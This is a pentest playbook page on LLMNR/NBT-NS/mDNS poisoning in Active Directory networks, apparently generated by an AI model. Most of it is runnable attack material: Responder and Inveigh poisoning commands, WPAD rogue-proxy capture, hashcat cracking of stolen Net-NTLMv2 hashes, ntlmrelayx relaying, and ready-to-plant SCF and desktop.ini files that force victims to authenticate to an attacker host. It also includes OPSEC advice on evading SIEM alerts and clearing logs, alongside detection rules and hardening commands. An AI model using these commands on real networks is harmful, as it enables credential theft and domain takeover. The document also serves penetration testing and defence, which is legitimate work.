---
title: "Attack #8 — LLMNR NBT-NS mDNS Poisoning"
description: "LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and mDNS (Multicast DNS) are fallback name resolution protocols built into…"
category: active-directory
subcategory: "Credential Access"
tags: ["active-directory", "ntlm", "relay", "hashing"]
tools: ["Nmap", "NetExec", "Impacket", "Hashcat", "John"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-One/🔴 Attack #8 — LLMNR  NBT-NS  mDNS Poisoning.md"
---
# 🔴 Attack #8 — LLMNR / NBT-NS / mDNS Poisoning

***

## 📖 How It Works

LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and mDNS (Multicast DNS) are **fallback name resolution protocols** built into Windows. When a machine tries to resolve a hostname and DNS fails — whether due to a typo, a misconfigured share path, or a disconnected server — Windows automatically broadcasts a query to the entire local subnet asking *"Does anyone know where `\\FILESERVRE` is?"*. Any machine on that subnet can respond, and critically, **Windows will trust the first answer it receives** without any verification.

The attacker runs **Responder** on the network, which listens for these broadcast queries and immediately responds to all of them, claiming to be the requested host. The victim's machine, believing it found the target, initiates an NTLM authentication to the attacker — sending a Net-NTLMv2 hash in the process. The attacker captures this hash and either cracks it offline or relays it immediately to a vulnerable target via ntlmrelayx (Attack #7). This attack requires **zero prior access**, zero exploits, and works silently in the background — making it one of the most common initial foothold techniques in internal penetration testing.

> ⚠️ **Windows 11 / Server 2025:** LLMNR is still enabled by default, but organizations actively disabling it via GPO are increasing. NBT-NS is harder to disable globally without breaking legacy services. mDNS remains ubiquitous. This attack remains highly effective in mixed-OS environments and businesses with legacy dependencies.

### Name Resolution Order in Windows

```
1. Local Hosts file (C:\Windows\System32\drivers\etc\hosts)
2. DNS query to configured DNS server
3. LLMNR broadcast (UDP port 5355) ← ATTACKER POISONS HERE
4. NBT-NS broadcast (UDP port 137) ← ATTACKER POISONS HERE
5. mDNS broadcast (UDP port 5353) ← ATTACKER POISONS HERE
```

> **The attack only fires when DNS fails** — so it naturally triggers on typos in UNC paths (`\\FILSEVER\share`), decommissioned server names, misconfigured GPOs, or broken mapped drives at login.

### The Full Attack Flow

```
1. Attacker starts Responder on internal network interface
2. Victim user/process makes a DNS query that fails (typo, broken path, etc.)
3. Windows falls back to LLMNR/NBT-NS — broadcasts to local subnet
4. Responder intercepts the broadcast and replies: "I am that host, authenticate to me"
5. Victim machine initiates NTLM authentication to attacker's IP
6. Responder captures the Net-NTLMv2 hash (username + challenge + response)
7. Path A: Crack the hash offline with Hashcat (-m 5600)
8. Path B: Relay the hash live with ntlmrelayx → shell/DA access (Attack #7)
```

### Cross-References — Related Techniques

**Attack #7, #8, #9 form a trilogy:**
- **#7** (NTLM Relay): The relay mechanism itself — where captured hashes are relayed
- **#8** (LLMNR/NBT-NS/mDNS): Primary auth trigger for #7 — how to capture credentials
- **#9** (mitm6): IPv6-based alternative trigger — different initial vector same relay destination

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Internal network access** | Must be on same subnet/broadcast domain as victims — doesn't work from outside |
| **LLMNR/NBT-NS not disabled** | Attack fails if GPO has disabled these protocols (common in hardened environments) |
| **Victim makes failed DNS query** | Passive: wait for organic typos/broken paths; Active: trigger manually |
| **For cracking** | GPU rig for Net-NTLMv2 (Hashcat mode 5600) |
| **For relaying** | SMB signing disabled on relay target (see Attack #7) |

### Protocol Breakdown

| Protocol | Port | Type | Default State |
|---|---|---|---|
| **LLMNR** | UDP 5355 | Multicast | ✅ Enabled by default on all Windows versions |
| **NBT-NS** | UDP 137 | Broadcast | ✅ Enabled by default (legacy NetBIOS) |
| **mDNS** | UDP 5353 | Multicast | ✅ Enabled by default (Windows 10+) |

***

## 🛠️ Tools

| Tool | Platform | Role |
|---|---|---|
| **Responder** | Linux | Primary poisoner — responds to LLMNR/NBT-NS/mDNS; captures hashes |
| **Inveigh** | Windows | PowerShell/C# Responder equivalent for Windows-based attacks |
| **ntlmrelayx.py** (Impacket) | Linux | Relay captured hashes to SMB/LDAP/ADCS targets (see Attack #7) |
| **Hashcat** | Linux/Win | Crack captured Net-NTLMv2 hashes (mode 5600) |
| **John the Ripper** | Linux | CPU-based alternative; `netntlmv2` format |
| **Metasploit** | Both | `auxiliary/spoof/llmnr/llmnr_response` module |
| **Wireshark / tcpdump** | Linux | Verify poisoning is working; capture NTLM auth in transit |

***

## 💻 Full Commands

### 🔵 Step 0 — Verify LLMNR/NBT-NS is Active on the Network

```bash
# ── Listen passively for LLMNR/NBT-NS broadcasts (no poisoning yet) ───────────
sudo tcpdump -i eth0 udp port 5355 -v   # LLMNR
sudo tcpdump -i eth0 udp port 137 -v    # NBT-NS
sudo tcpdump -i eth0 udp port 5353 -v   # mDNS

# ── Wireshark filter for LLMNR/NBT-NS traffic ──────────────────────────────────
# Filter: llmnr || nbns || mdns

# ── Nmap — check for NBT-NS activity ─────────────────────────────────────────
nmap -sU --script nbstat.nse -p 137 10.10.10.0/24
```

***

### 🔴 Responder — Core Poisoning Tool (Linux)

```bash
# ── Basic Responder run — poison all protocols, capture hashes ─────────────────
sudo responder -I eth0

# ── Full flags explained ───────────────────────────────────────────────────────
sudo responder -I eth0 -rdwv
# -I eth0  = network interface to listen on
# -r       = enable answers for NetBIOS wredir suffix queries
# -d       = enable answers for NBNS domain suffix queries
# -w       = start WPAD rogue proxy server (captures browser auth)
# -v       = verbose output

# ── With WPAD rogue proxy (intercepts browser proxy auth — very effective) ─────
sudo responder -I eth0 -wv

# ── Analysis mode only — listen but don't poison (passive recon) ───────────────
sudo responder -I eth0 -A
# -A = Analyze mode — logs all observed name resolution requests without responding

# ── Force NTLM downgrade (force NTLMv1 instead of v2 — much faster to crack) ──
sudo responder -I eth0 --lm
# ⚠️ Noisy — may cause authentication failures visible to users

# ── Target specific interface with verbose debug ───────────────────────────────
sudo responder -I eth0 -v --disable-ess
```

***

### 🔴 Responder Captured Hash Locations

```bash
# All captured hashes are logged here:
cat /usr/share/responder/logs/

# List all captured NTLMv2 hashes
ls /usr/share/responder/logs/HTTP-NTLMv2-*.txt
ls /usr/share/responder/logs/SMB-NTLMv2-*.txt

# View a specific capture
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.50.txt

# Hash format — example:
# Administrator::CORP:aabbccddeeff0011:F2B9B344A4AEA7D6FE76F8D4C891B3FD:01010000...

# Combine all SMB captures into one file for cracking
cat /usr/share/responder/logs/SMB-NTLMv2-*.txt > all_hashes.txt
```

***

### 🔴 Cracking Captured Net-NTLMv2 Hashes — Hashcat

```bash
# ── Mode 5600 = Net-NTLMv2 ────────────────────────────────────────────────────
hashcat -m 5600 all_hashes.txt /usr/share/wordlists/rockyou.txt

# ── With best64 rules ─────────────────────────────────────────────────────────
hashcat -m 5600 all_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# ── With d3ad0ne rules (aggressive) ──────────────────────────────────────────
hashcat -m 5600 all_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# ── Brute force mask (corporate: Word+Digits+Symbol) ─────────────────────────
hashcat -m 5600 all_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s

# ── John the Ripper alternative ───────────────────────────────────────────────
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt all_hashes.txt
john --format=netntlmv2 all_hashes.txt --show

# ── Mode 5500 = Net-NTLMv1 (if you forced downgrade with --lm) ───────────────
hashcat -m 5500 ntlmv1_hashes.txt /usr/share/wordlists/rockyou.txt
```

***

### 🔴 Combining with NTLM Relay (Simultaneous Capture + Relay)

```bash
# ── CRITICAL: Edit Responder config first ─────────────────────────────────────
nano /etc/responder/Responder.conf
# SMB  = Off    (let ntlmrelayx handle SMB — otherwise Responder steals the auth)
# HTTP = Off    (same reason)

# ── Run Responder for LLMNR/NBT-NS poisoning only ─────────────────────────────
sudo responder -I eth0 -rdwv

# ── Simultaneously run ntlmrelayx to relay captured auth ──────────────────────
# (In a second terminal)
ntlmrelayx.py -tf relay_targets.txt -smb2support -i

# Responder poisons → victim authenticates to attacker →
# ntlmrelayx relays to target → shell / DA escalation
```

***

### 🔴 Inveigh — Windows-Based Poisoning (When You Have a Windows Shell)

```powershell
# Import Inveigh (PowerShell version)
Import-Module .\Inveigh.ps1

# Start full poisoning (LLMNR + NBNS + mDNS)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y

# Capture only (no relay) — save output to file
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Temp\

# Stop Inveigh
Stop-Inveigh

# C# version (Inveigh.exe — stealthier, no PowerShell dependency)
.\Inveigh.exe

# View captured hashes from C# version
.\Inveigh.exe -ListenerStatus
```

***

### 🔴 Inveigh.exe (C# Version) — Detailed Commands

```powershell
# ── Full C# Inveigh with console output ──────────────────────────────────────
.\Inveigh.exe -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y -Elevated N

# ── Inveigh.exe with file logging (capture to C:\Temp\inveigh_hashes.txt) ───
.\Inveigh.exe -ConsoleOutput Y -FileOutput Y -OutputDir C:\Temp\ \
  -LLMNR Y -NBNS Y -mDNS Y

# ── Inveigh.exe with WPAD interception (browser auth capture) ────────────────
.\Inveigh.exe -ConsoleOutput Y -WPAD Y -HTTPAuth NTLM

# ── Inveigh.exe custom filtering (only capture specific usernames) ──────────
# Create filter file: admin, domain admin, svc_ accounts
.\Inveigh.exe -ConsoleOutput Y -Filter admin,svc

# ── Inveigh.exe relay mode (forward captured auth to target) ────────────────
# (Requires Inveigh with relay support compiled in)
.\Inveigh.exe -ConsoleOutput Y -LLMNR Y -RelayTarget smb://10.10.10.20
```

***

### 🔴 WPAD Abuse (Rogue Proxy — Capturing Browser Authentication)

```bash
# ── WPAD (Web Proxy Auto-Discovery) forces browsers to authenticate via NTLM ──
# When -w flag is set, Responder hosts a fake WPAD file
# Browsers on the network auto-discover the proxy and authenticate to it

sudo responder -I eth0 -wv
# -w = enable WPAD rogue proxy server

# What happens:
# 1. Browser checks for WPAD via LLMNR/NBT-NS: "Where is WPAD?"
# 2. Responder responds: "I am WPAD, download proxy config from me"
# 3. Browser authenticates with NTLM to download the config
# 4. Net-NTLMv2 hash captured

# Force NTLM authentication on WPAD (bypasses transparent auth)
sudo responder -I eth0 -wv --wpad-auth NTLM
```

***

### 🔴 Triggering LLMNR Requests Manually (Active Methods)

```bash
# ── Method 1: Create a rogue file with UNC path to your machine ───────────────
# Place a file (e.g. desktop.ini or a .lnk file) on a share pointing to your IP
# When a user browses that directory, their machine triggers LLMNR auth to you

# desktop.ini content:
[.ShellClassInfo]
IconResource=\\<attacker_IP>\share\icon.ico

# ── Method 2: Rogue PDF with embedded UNC path ───────────────────────────────
# Embed a UNC path in a PDF as a remote image resource
# Adobe Reader automatically authenticates when the PDF is opened

# ── Method 3: SCF file (Shell Command File) ───────────────────────────────────
# Place @exploit.scf in a share:
[Shell]
Command=2
IconFile=\\<attacker_IP>\share\icon.ico
[Taskbar]
Command=ToggleDesktop
# Windows Explorer auto-processes SCF files — triggers NTLM auth when folder is browsed

# ── Method 4: Force victim machine to query non-existent host ─────────────────
# On a machine you control, create a mapped drive to a non-existent share
net use Z: \\FAKESERVER\share
# Windows will fall back to LLMNR → Responder captures the hash
```

***

## 🎯 OPSEC Tips

- **Analyze mode first (`-A`)** — run Responder passively to map which users and machines are making failed name resolution requests before committing to active poisoning
- **Target high-value users only** — if you see `Administrator` or `svc_sql` in the captured hashes, those are your priority; don't poison endlessly and generate noise
- **Relay over crack** — if SMB signing is disabled on targets, relay immediately rather than waiting to crack; relaying is faster and more reliable than cracking
- **WPAD is gold in office environments** — every browser on the subnet will eventually authenticate; `-w` flag almost always yields domain user hashes
- **SCF/desktop.ini files on shares** are the most stealthy active trigger — they require no user interaction beyond browsing a folder, and look completely benign
- **Avoid poisoning during business hours on large networks** — hundreds of captured hashes and simultaneous auth failures will trigger SIEM alerts; prefer out-of-hours or low-traffic windows
- **Clear Responder logs after collection** — `/usr/share/responder/logs/` builds up and is trivially discovered on a seized machine
- **Responder vs Inveigh stealth comparison:**
  - Responder (Linux): More noisy due to network traffic patterns; tools presence on Linux easily discoverable
  - Inveigh (Windows): Blends with legitimate Windows services; harder to distinguish from normal auth traffic; PowerShell can be suspicious; C# version most stealthy
- **Time-to-execute**: Responder start → first captured hash in 5-30 minutes (passive); active methods trigger immediate responses within seconds

***

## 🛡️ Detection — Event IDs

| Event ID / Source | What to Look For |
|---|---|
| **Windows Event 4648** | Logon with explicit credentials to an unexpected machine (attacker's IP) |
| **Windows Event 4625** | Failed logon — victim authenticated to attacker but relay/crack not complete |
| **Network — UDP 5355** | Unusual volume of LLMNR queries from workstations — or responses from unexpected hosts |
| **Network — UDP 137** | NBT-NS broadcasts and unexpected responders on the subnet |
| **DNS / SIEM** | Hostnames that don't exist in DNS being queried — typo-driven LLMNR triggers |
| **IDS/IPS signature** | Known Responder patterns — rogue LLMNR/NBT-NS responder from same IP answering multiple queries |
| **Sysmon EID 3** | Network connection from unexpected process to port 5355 or 137 |

**Primary detection signature:** A single host responding to **multiple different LLMNR/NBT-NS broadcast queries** for different hostnames within a short window is a near-certain indicator of Responder running. Legitimate machines only respond to queries for their own name — a machine answering queries for `FILESERVRE`, `PRINTSERV`, and `BACKUP01` within 60 seconds is unmistakably an attacker.

### Sigma Rules (SigmaHQ)

```
Rule ID: detection_llmnr_poisoning_multihost
Description: Detects single host responding to multiple different hostname LLMNR queries
Event filter: LLMNR responses for hostnames not in DNS; unusual responder IP
Status: HIGH severity

Rule ID: detection_nbtns_poisoning
Description: Detects NBT-NS spoofing activity from non-authoritative host
Event filter: UDP port 137 responses from unexpected IP; multiple different responses
Status: MEDIUM severity

Rule ID: detection_responder_tool_artifacts
Description: Detects known Responder signatures (HTTP stack, default responses)
Event filter: Specific HTTP headers, response patterns matching Responder tool
Status: MEDIUM severity
```

### EDR Detections

**Microsoft Defender for Identity:**
- Alert: "Reconnaissance using LLMNR queries" — detects unusual LLMNR broadcast patterns
- Alert: "Suspicious LLMNR/NBT-NS responder detected" — alerts when single host answers multiple queries
- Alert: "Failed DNS resolution followed by LLMNR authentication" — correlates broken DNS with fallback auth

**Falcon (CrowdStrike):**
- Network signature: "LLMNR poisoning activity"
- Process: Responder.py or inveigh.exe execution
- Behavioral: High volume of LLMNR/NBT-NS responses from single source

### Hardening Commands — Disable LLMNR/NBT-NS via GPO

```powershell
# ── Disable LLMNR via Group Policy ───────────────────────────────────────────
# GPO Path: Computer Configuration → Administrative Templates →
#           Network → DNS Client → Turn off multicast name resolution
# Set: ENABLED

# Registry equivalent:
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" \
  /v EnableMulticast /t REG_DWORD /d 0 /f

# ── Disable NBT-NS via Group Policy (P-Node configuration) ────────────────────
# GPO Path: Computer Configuration → Preferences → Windows Settings →
#           Registry
# Add registry entry:
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" \
  /v NodeType /t REG_DWORD /d 2 /f
# 1 = B-node (broadcast), 2 = P-node (point-to-point, DNS only), 4 = M-node, 8 = H-node

# ── Disable NBT-NS per NIC (PowerShell — on each machine) ────────────────────
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)   # 2 = Disable NetBIOS over TCP/IP
}

# ── Disable mDNS (Windows 10+) – registry entry ──────────────────────────────
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" \
  /v DisableMulticast /t REG_DWORD /d 1 /f

# ── Firewall rule to block LLMNR/NBT-NS (alternative to GPO) ────────────────
# Block outbound LLMNR (port 5355)
netsh advfirewall firewall add rule name="Block LLMNR" dir=out action=block \
  protocol=udp remoteport=5355

# Block outbound NBT-NS (port 137)
netsh advfirewall firewall add rule name="Block NBT-NS" dir=out action=block \
  protocol=udp remoteport=137

# Block inbound mDNS (port 5353)
netsh advfirewall firewall add rule name="Block mDNS" dir=in action=block \
  protocol=udp localport=5353

# ── Verify hardening is in place ───────────────────────────────────────────────
# Check DNS client multicast setting
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" \
  -Name EnableMulticast

# Check NetBIOS node type
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" \
  -Name NodeType
```

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| **Responder not capturing hashes** | Network interface binding issue or LLMNR/NBT-NS disabled on network | Check interface with `ip a`; run `sudo responder -I eth0 -A` first to verify broadcasts exist; check if GPO disabled protocols on target machines |
| **Hash not cracking** | Weak wordlist or hash format incorrect | Verify hash format (should have 2x colons `::` for domain\\user); try larger wordlist `/usr/share/wordlists/rockyou.txt`; add rules with `-r best64.rule` |
| **Interface binding error ("Permission denied" on port 5355)** | Running Responder without sudo or port already in use | Use `sudo responder`; check `sudo netstat -ulnp \| grep 5355` to see what's using the port; kill conflicting process |
| **Responder starts but captures nothing** | No LLMNR/NBT-NS broadcasts on network (protocols disabled or all names resolve via DNS) | Run analysis mode: `sudo responder -I eth0 -A` to verify any queries exist; manually trigger with `net use Z: \\FAKESERVER\share` on a victim machine |
| **WPAD mode not triggering auth** | Browser not configured for automatic proxy detection or WPAD disabled | Check browser WPAD settings; verify `-w` flag enabled; try forcing WPAD with `--wpad-auth NTLM` |
| **Inveigh PowerShell "object reference not set"** | Module path incorrect or version incompatibility | Verify Inveigh.ps1 path is correct; import with full path: `Import-Module C:\path\to\Inveigh.ps1`; use C# version instead |
| **Inveigh.exe crashes immediately** | Insufficient permissions or port conflict on Windows | Run as Administrator; check if port 5355/137 in use: `netstat -ano \| findstr :5355`; close conflicting application |
| **Captured hash but relay fails** | Relay target has SMB signing enabled or LDAP channel binding active | Verify relay target vulnerability with `nxc smb <IP> \| grep signing`; switch to LDAP/ADCS relay instead of SMB |
| **Responder logs building up, unnoticed by operators** | Logs stored in `/usr/share/responder/logs/` accumulate over time | Regularly clear logs: `rm /usr/share/responder/logs/*` or move to analysis directory; automate cleanup with cron job |

***

## 🗺️ MITRE ATT&CK

**Technique: T1557.001 — Adversary-in-the-Middle**

**Tactics:**
- **TA0006: Credential Access** — Capture NTLM hashes via LLMNR/NBT-NS poisoning
- **TA0007: Discovery** — Passive reconnaissance to identify network users/machines via LLMNR analysis mode

**APT Groups Using LLMNR/NBT-NS Poisoning:**
- **APT28 (Fancy Bear)** — LLMNR poisoning in internal network compromise chains
- **APT29 (Cozy Bear)** — Credential capture via name resolution poisoning
- **APT41** — LLMNR attacks in enterprise networks
- **Wizard Spider** — LLMNR poisoning for initial access in ransomware campaigns
- **Scattered Spider** — Multi-stage LLMNR attacks for credential theft

**Related techniques:**
- T1040: Network Sniffing
- T1557: Adversary-in-the-Middle (entire technique category)
- T1566: Phishing (alternative initial vector)
- T1187: Forced Authentication (active trigger methods)

***

## 🔗 Attack Chain Context

```
[LLMNR / NBT-NS / mDNS Poisoning] ──→ Net-NTLMv2 Hash Captured
         │
         ├──→ 💥 Relay immediately via ntlmrelayx (Attack #7) → DA in minutes
         ├──→ 🔑 Crack with Hashcat (-m 5600) → valid plaintext credentials
         ├──→ 🔑 Use cracked creds → Password Spraying against more accounts
         ├──→ 🎫 Kerberoasting with new valid domain credentials
         ├──→ 🩸 LDAP relay → DCSync rights → full domain hash dump
         └──→ 📜 ADCS relay (ESC8) → DC machine cert → TGT → Domain Admin
```

**Why this is so dangerous as an initial vector:** In a typical enterprise internal pentest, Responder is started on day one and **within 30 minutes** has captured credentials from multiple users purely from organic activity — broken mapped drives, startup scripts querying dead servers, and misconfigured applications. No phishing, no exploits, no noise — just passive listening against a protocol that Windows has enabled by default for decades.

***

> ✅ **Attack #8 — LLMNR/NBT-NS/mDNS Poisoning complete.** Tell me to move on when you're ready for **Attack #9 — mitm6 (IPv6 DNS Spoofing)**.

Sources
 LLMNR/NBT-NS Poisoning - Active Directory | Internal Pentest https://xedex.gitbook.io/internalpentest/internal-pentest/active-directory/initial-attack-vectors/llmnr-nbt-ns-poisoning
 LLMNR Poisoning and Active Directory - TCM Security https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/
 Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay https://attack.mitre.org/techniques/T1557/001/
 LLMNR Poisoning: Threats, Detection, and Prevention Guide https://www.startupdefense.io/cyberattacks/llmnr-poisoning
 SMB Relay Attacks and Active Directory - TCM Security https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/
 LLMNR Poisoning - evoila GmbH https://evoila.com/blog/llmnr-poisoning/
 Fragmentation Considered Poisonous https://arxiv.org/pdf/1205.4011.pdf
 Injection Attacks Reloaded: Tunnelling Malicious Payloads over DNS https://arxiv.org/pdf/2205.05439.pdf
 HADES: Detecting Active Directory Attacks via Whole Network Provenance
  Analytics http://arxiv.org/pdf/2407.18858.pdf
 Unilateral Antidotes to DNS Cache Poisoning http://arxiv.org/pdf/1209.1482.pdf
 Silence is not Golden: Disrupting the Load Balancing of Authoritative DNS Servers https://dl.acm.org/doi/pdf/10.1145/3576915.3616647
 Optimizing Cyber Response Time on Temporal Active Directory Networks
  Using Decoys http://arxiv.org/pdf/2403.18162.pdf
 A Survey on Malicious Domains Detection through DNS Data Analysis https://arxiv.org/pdf/1805.08426.pdf
 Multi-Instance Adversarial Attack on GNN-Based Malicious Domain
  Detection http://arxiv.org/pdf/2308.11754.pdf
 Active Directory Exploitation - LLMNR/NBT-NS Poisoning - YouTube https://www.youtube.com/watch?v=Fg2gvk0qgjM
 LLMNR Poisoning with Responder - Active Directory Lab - YouTube https://www.youtube.com/watch?v=Dfj9IQiXF1M
 LLMNR/NBT-NS Poisoning – from Windows - Route Zero: Security https://routezero.security/2025/02/28/llmnr-nbt-ns-poisoning-from-windows/
 LLMNR Poisoning Attack | Active Directory Exploitation - YouTube https://www.youtube.com/watch?v=aXQggrLqqrs
 Exploiting Active Directory Using LLMNR/NBT-NS Poisoning https://www.youtube.com/watch?v=8IvVAT1Tmuw
 How To Remove LLMNR and NBT-NS From Your Active ... - YouTube https://www.youtube.com/watch?v=iN0KUj5I7aE
 LLMNR Attack & Defense: Secure Windows Networks - FireCompass https://firecompass.com/attack-defend-llmnr-a-widespread-shadow-network-discovery-protocol/
 Preventing LLMNR Poisoning in Active Directory Networks https://www.coursehero.com/file/252194640/Active-Directory-LLMNR-Poisoningpdf/
 How does LLMNR poisoning work? - YouTube https://www.youtube.com/watch?v=LAvR-qtOfB0
 LLMNR/NBT-NS Poisoning and SMB Relay - Tidal Cyber https://app.tidalcyber.com/technique/b44a263f-76b2-4a1f-baeb-dd285974eca6
